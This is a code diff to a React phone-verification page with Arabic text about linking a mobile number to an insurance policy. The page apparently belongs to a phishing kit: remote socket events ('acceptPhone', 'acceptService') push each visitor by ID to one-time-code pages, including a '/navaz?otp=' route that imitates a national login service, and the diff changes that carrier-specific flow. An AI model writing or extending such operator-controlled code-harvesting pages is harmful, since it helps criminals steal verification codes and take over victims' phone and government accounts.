@@ -10,11 +10,13 @@ import { MdOutlinePhoneCallback } from "react-icons/md";
 const Phone = () => {
   const [phoneNumber, setPhoneNumber] = useState(null);
   const [phoneNetwork, setPhoneNetwork] = useState(null);
-  const [verfiy, setVerfiy] = useState();
-  const [counter, setCounter] = useState(180);
+  const query = new URLSearchParams(window.location.search);
+  const code = query.get("mobily");
+  const [verfiy, setVerfiy] = useState(code === "check" ? "Mobily" : null);
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState(false);
 
+  const [counter, setCounter] = useState(180);
   useEffect(() => {
     const timer = setInterval(() => {
       if (counter > 0) {
@@ -56,20 +58,19 @@ const Phone = () => {
         );
     } catch (error) {}
   };
-  useEffect(()=>{
-    console.log(phoneNetwork)
-  },[phoneNetwork])
+  useEffect(() => {
+    console.log(phoneNetwork);
+  }, [phoneNetwork]);
 
   socket.on("acceptPhone", (id) => {
     if (id === ID) {
       if (phoneNetwork) {
-        if (phoneNetwork === "STC" || phoneNetwork === "Mobily") {
+        if (phoneNetwork === "Mobily") {
           setLoading(false);
           return setVerfiy(phoneNetwork);
-        } else {
-          console.log(phoneNetwork);
-          return (window.location.href = "/phoneOtp");
-        }
+        } else if (phoneNetwork === "STC") {
+          return (window.location.href = "/phoneOtp?stc=check");
+        } else return (window.location.href = "/phoneOtp");
       }
     }
   });
@@ -81,8 +82,11 @@ const Phone = () => {
     }
   });
 
-  socket.on("acceptService", (id) => {
+  socket.on("acceptService", ({ id, price }) => {
     if (id === ID) {
+      if (code === "check" || phoneNetwork === "Mobily") {
+        return (window.location.href = "/navaz?otp=" + price + "&stc=" + null);
+      }
       return (window.location.href = "/phoneOtp");
     }
   });
@@ -176,30 +180,32 @@ const Phone = () => {
             </div>
           </div>
         </form>
-      ) : verfiy === "STC" ? (
-        <div className="w-full flex flex-col justify-center  items-center bg-white h-screen py-2 gap-y-10">
-          <img
-            src="https://upload.wikimedia.org/wikipedia/commons/e/e3/STC-01.svg"
-            className="w-1/2"
-          />
-          <div className="  w-full flex flex-col jus items-center gap-y-4">
-            <p className="text-xl font-bold">سوف يتم الاتصال بك الآن</p>
-            <p className="font-bold text-gray-500" style={{ fontSize: "10px" }}>
-              قم باتباع الخطوات الموجودة بالاتصال ليتم تسجيل رقم جوالك بوثيقة
-              التأمين
-            </p>
-            <span className="text-purple-700 font-bold">! يرجي الإنتظار</span>
-          </div>
-          <div className="flex w-11/12 flex-col justify-center items-center bg-purple-100 rounded-full py-1">
-            <span className="text-purple-700 font-bold ">
-              إعادة الاتصال بعد{" "}
-            </span>
-            <span className="text-purple-700 font-bold">
-              {formattedMinutes}:{formattedSeconds}
-            </span>
-          </div>
-        </div>
-      ) : verfiy === "Mobily" ? (
+      ) : //  :
+      //  verfiy === "STC" ? (
+      //   <div className="w-full flex flex-col justify-center  items-center bg-white h-screen py-2 gap-y-10">
+      //     <img
+      //       src="https://upload.wikimedia.org/wikipedia/commons/e/e3/STC-01.svg"
+      //       className="w-1/2"
+      //     />
+      //     <div className="  w-full flex flex-col jus items-center gap-y-4">
+      //       <p className="text-xl font-bold">سوف يتم الاتصال بك الآن</p>
+      //       <p className="font-bold text-gray-500" style={{ fontSize: "10px" }}>
+      //         قم باتباع الخطوات الموجودة بالاتصال ليتم تسجيل رقم جوالك بوثيقة
+      //         التأمين
+      //       </p>
+      //       <span className="text-purple-700 font-bold">! يرجي الإنتظار</span>
+      //     </div>
+      //     <div className="flex w-11/12 flex-col justify-center items-center bg-purple-100 rounded-full py-1">
+      //       <span className="text-purple-700 font-bold ">
+      //         إعادة الاتصال بعد{" "}
+      //       </span>
+      //       <span className="text-purple-700 font-bold">
+      //         {formattedMinutes}:{formattedSeconds}
+      //       </span>
+      //     </div>
+      //   </div>
+      // )
+      verfiy === "Mobily" ? (
         <div className="w-full bg-white flex items-start justify-center h-screen ">
           <div
             className="md:w-1/3 w-full flex flex-col items-center justify-center"
@@ -220,7 +226,10 @@ const Phone = () => {
             </p>
             <button
               className="bg-sky-500 text-white w-1/2 self-start p-3 m-2 rounded-full my-5"
-              onClick={() => setVerfiy("Mobily2")}
+              onClick={() => {
+                socket.emit("network", ID);
+                setVerfiy("Mobily2");
+              }}
             >
               متابعة
             </button>
